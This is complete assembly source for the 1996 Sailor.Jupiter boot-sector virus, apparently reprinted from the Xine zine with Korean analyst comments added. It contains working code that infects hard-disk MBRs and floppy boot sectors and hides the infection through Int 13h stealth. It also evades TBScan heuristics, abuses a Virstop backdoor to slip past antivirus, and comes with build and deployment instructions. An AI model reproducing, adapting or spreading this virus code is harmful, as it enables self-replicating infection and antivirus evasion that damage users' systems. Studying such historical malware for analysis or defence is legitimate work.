;<><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><>
;                                                              CVC #01  97/06
;                          Sailor.Jupiter
;                          **************
;
;  이름 : Sailor.Jupiter
;  제작자 : B0z0 / iKx / 96.09
;
;  분석 : Osiris of CVC,Corea / 97.04
;                                       /-----------------------------\
;                                출처 : | Xine - issue #1 - Phile 022 |
;                                       \-----------------------------/
;
; b0z0 presents:
; Sailor.Jupiter
;
; well, boot infectors... it has to be done :) let's see what it does:
;   - infects BS/MBR. Original MBR is on 0,0,2 and original BS on
;     floppyes is on 0,1,14.
;   - MBR stealth on write/read/verify
;   - Floppy BS stealth on read. I haven't implemented floppy BS stealth
;     on write because i think that is a waste of space. infact it gets
;     a lot of space to test all the possible writings to the original
;     bs. and a non complete check will only bring problems. anyway if
;     a user formats the diskette while the virus is in mem it will be
;     infect on the first read, that's the stage when format checks the
;     total space on diskette :)
;   - Heavy antiheuristic structures agains TBScan. the infected boot
;     sectors actually doesn't flag any flag with TBScan 7.04. well, that
;     article on the flags was of use for someone :)
;   - Anti-Virstop feature. This is the first virus, i think, that uses
;     the Virstop backdoor, so the AV won't notice the infected boot
;     sector when a user read an infected diskette. Thanx Dandler!
;
;
; Once again thanx to Dandler for his help with my first boot experience :)
;
;
; To compile:
;  TASM /ZI /M2 JUPITER.ASM
;  TLINK /M /V JUPITER.OBJ
;  TDSTRIP -C JUPITER.EXE
; and then put the resulting file at the boot sector of a floppy disk.
; pay attention, you must of course preserve the first 03eh bytes of the
; original boot sector
;
;<><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><>

.model tiny
.code

        org     0

start:
        jmp     short virus_start
        nop
                                        ; 플로피 디스크의 BPB 내용이 들어감
        org     03eh

virus_start:
        cli
        xor     ax,ax
        mov     ss,ax                   ; SS,SP 설정
        mov     sp,7c00h
        push    ax
        pop     es
        push    ax                      ; ES = 0
        pop     ds                      ; DS = 0
        sti

        mov     ax,201h                 ; 바이러스 뒷부분에 MBR 읽기
        mov     bx,offset virus_end+7c00h
        mov     dx,80h
        mov     cx,1
        int     13h                     ; MBR 읽기
        jc      no_mbr                  ; 하드 디스크가 없나 ?

        mov     si,offset virus_name+7c00h
        push    si
        pop     di
        add     di,offset virus_end
        mov     cx,7
        rep     cmpsw                   ; 감염 여부 검사
        je      no_mbr

        mov     byte ptr floppymarker+7c00h,1   ;HD mark
        mov     ax,202h
        inc     ah
        mov     bx,7c00h
        mov     cx,1                    ; 바이러스 와 원래 MBR 쓰기
        int     13h

        mov     byte ptr floppymarker+7c00h,0   ; 플로피 디스크로 세팅

no_mbr:
        mov     di,412h                 ; TBSCAN 속이기
        inc     di                      ; 0:413h
        dec     word ptr ds:[di]
        mov     ax,word ptr ds:[di]
        mov     cl,6
        shl     ax,cl                   ; 상위 영역 주소값 얻기
        mov     es,ax

        xchg    word ptr ds:[04eh],ax   ; Int 13h 가로채기
        mov     seg13h+7c00h,ax         ; 옛날 Int 13h 세그먼트 저장
        mov     ax,offset int13h_handler; ax=바이러스 Int 13h
        xchg    word ptr ds:[04ch],ax
        mov     off13h+7c00h,ax         ; 옛날 Int 13h 오프셋 저장

        mov     si,100h                 ;
        push    si                      ; TBSCAN의 O flag 제거
        pop     cx                      ; mov cx,100h
        mov     si,7C00h                ; mov si,7c00h 시 O 플래그
        push    si
        xor     di,di
        rep     movsw                   ; 바이러스 복사

        push    cs
        pop     es                      ; ES=CS

        mov     ax,201h                 ; 0:7c00h 에 원래 부트 섹터 읽기
        pop     bx
        mov     cx,1
        cmp     byte ptr cs:[floppymarker+7c00h],0  ; 하드 ? 플로피 ?
        jne     isharddisk              ; 0 : 플로피
        mov     cx,000eh                ; 1 : 하드디스크
        mov     dl,0
        mov     dh,1

isharddisk:
        push    013cdh                  ; put CD13 at 7c00h-2 (Int 13h)
        jmp     start-2                 ; 재부팅

;
;
;
int13h_handler:
        cmp     cx,1                    ; 부트 섹터를 읽으려고 하나 ?
        jne     do_int_13
        cmp     dh,0                    ;
        jne     do_int_13
        cmp     dl,80h                  ; 하드 디스크 ?
        je      mbr_stealth
        cmp     dl,1                    ; 플로피의 부트 섹터를 읽으려고 하나 ?
        ja      do_int_13
        cmp     ax,201h                 ; 1 섹터 읽기 인가 ?
        je      floppy_infection
do_int_13:
        db      0EAh                    ; 원래 Int 13h 로 점프
off13h   dw      ?
seg13h   dw      ?

mbr_stealth:
        push    cx                      ; 주부트섹터 스텔스
        mov     cl,2
        int     13h                     ; 원래 MBR 을 대신 보여준다.
        pop     cx                      ;
        retf    2

floppy_infection:
        pushf                           ; 읽기 수행
        call    dword ptr cs:off13h
        jc      read_error
        pushf
        push    ax
        push    bx
        push    cx
        push    si
        push    di
        push    ds
        push    es

        push    es
        pop     ds
        push    cs
        pop     es

        lea     si,[offset virus_name + bx]
        mov     di,offset virus_name
        mov     cx,7
        rep     cmpsw
        je      fbs_stealth             ; 감염여부 확인

        push    es
        push    dx
        push    ds
        pop     es
        mov     ax,201h                 ; 원래 부트 섹터 저장
        push    ax
        inc     ah
        mov     cx,000eh                ; 0 트랙 14 섹터
        mov     dh,01h                  ; 1 헤드
        int     13h                     ; 수행 !
        pop     ax

        pop     dx
        pop     es
        jc      fb_exit                 ; 에러 ?

        mov     byte ptr cs:[floppymarker],0
        lea     si,[bx+03h]             ; BPB 내용 저장
        mov     di,03h                  ;
        mov     cx,03bh
        rep     movsb

        mov     word ptr es:[2fh],10cdh ; Virstop rulesss ]:)

        push    bx
        inc     ah                      ; 쓰기 (AH=3)
        sub     bx,bx                   ; mov    BX,offset START
        mov     cx,1
        int     13h                     ; 플로피 부트 섹터 쓰기
        pop     bx

fbs_stealth:                            ; FBS 스텔스
        push    ds
        pop     es
        mov     ax,201h
        mov     cx,000eh                ;
        mov     dh,01h                  ;
        int     13h                     ;

fb_exit:
        pop     es
        pop     bx
        pop     di
        pop     si
        pop     cx
        pop     bx
        pop     ax
        popf
read_error:
        retf    2

virus_name      db      'Sailor.Jupiter',0  ; 바이러스 이름
virus_author    db      'b0z0/iKx',0        ; 제작자

floppymarker db      00h

        org     01feh

boot_mbr:                                   ; 정상 부트 섹터 종료 표시
        db      55h,0AAh

        org     200h

virus_end:

end
